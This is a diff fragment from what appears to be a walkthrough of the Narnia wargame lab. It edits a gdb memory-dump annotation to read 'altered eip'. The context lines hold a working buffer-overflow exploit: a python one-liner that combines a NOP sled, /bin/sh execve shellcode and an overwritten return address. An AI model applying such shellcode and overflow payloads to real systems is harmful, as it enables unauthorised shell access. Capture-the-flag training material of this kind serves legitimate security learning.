@@ -70,7 +70,7 @@ Breakpoint 1, 0x0804855f in main ()
 0xffffd688:     0x6868732f      0x6e69622f      0x5350e389      0xc289e189
 0xffffd698:     0x80cd0bb0      0xffffd660      0x00000000      0xffffd734
                                      ^
-                                  altered
+                                altered eip
 
 narnia3@narnia:~$ /narnia/narnia3 $(python -c 'print "\x90"*35 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd6\xff\xff"')
 error opening 1Ph//shh/binPS̀`
